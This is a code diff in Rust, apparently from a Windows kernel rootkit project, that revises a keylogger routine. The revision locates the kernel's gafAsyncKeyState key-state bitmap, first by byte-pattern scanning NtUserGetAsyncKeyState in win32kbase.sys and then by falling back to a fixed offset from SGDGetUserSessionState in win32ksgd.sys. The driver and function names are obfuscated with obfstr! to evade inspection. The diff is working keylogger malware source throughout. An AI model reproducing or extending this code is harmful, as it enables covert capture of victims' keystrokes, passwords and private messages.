@@ -103,23 +103,44 @@ impl Keylogger {
     /// * `Ok(*mut c_void)` - If successful, returns a pointer to the mapped user-mode address of `gafAsyncKeyState`.
     /// * `Err(ShadowError)` - If any error occurs while finding the address or mapping memory.
    unsafe fn get_gafasynckeystate_address() -> Result<*mut u8> {
-        // Get the base address of the new driver win32ksgd.sys.
-        let module_address = get_module_base_address(obfstr!("win32ksgd.sys"))?;
-        log::info!("win32ksgd.sys base address: {:p}", module_address);
+    // Attempt primary logic: Using pattern scan on win32kbase.sys
+    let module_address = get_module_base_address(obfstr!("win32kbase.sys"))?;
+    let function_address = get_function_address(obfstr!("NtUserGetAsyncKeyState"), module_address)?;
+    let pattern = [0x48, 0x8B, 0x05];
 
-        // Get the address of SGDGetUserSessionState exported by win32ksgd.sys.
-        let function_address = get_function_address(obfstr!("SGDGetUserSessionState"), module_address)?;
-        log::info!("SGDGetUserSessionState address: {:p}", function_address);
+    match scan_for_pattern(function_address, &pattern, 3, 7, 0x200) {
+        Ok(address) => {
+            // Successfully found the pattern.
+            Ok(address)
+        }
+        Err(e) => {
+            // Log the error and fall back to alternative logic.
+            log::warn!(
+                "Pattern scan failed with error: {:?}. Falling back to alternative logic.",
+                e
+            );
 
-        // Calculate the address of the key state bitmap by adding the offset 0x3708.
-        let key_state_address = function_address.add(0x3708);
-        log::info!(
-            "Key state address (SGDGetUserSessionState + 0x3708): {:p}",
-            key_state_address
-        );
+            // Fallback logic: use the new driver win32ksgd.sys.
+            let fallback_module_address = get_module_base_address(obfstr!("win32ksgd.sys"))?;
+            log::info!("win32ksgd.sys base address: {:p}", fallback_module_address);
 
-        Ok(key_state_address)
+            // Get the address of SGDGetUserSessionState.
+            let fallback_function_address =
+                get_function_address(obfstr!("SGDGetUserSessionState"), fallback_module_address)?;
+            log::info!("SGDGetUserSessionState address: {:p}", fallback_function_address);
+
+            // Calculate the key state address by adding the offset.
+            let key_state_address = fallback_function_address.add(0x3708);
+            log::info!(
+                "Key state address (SGDGetUserSessionState + 0x3708): {:p}",
+                key_state_address
+            );
+
+            Ok(key_state_address)
+        }
     }
+}
+
 
     /// Retrieves the user-mode mapped address for the key state bitmap.
     pub unsafe fn get_user_address_keylogger() -> Result<*mut c_void> {
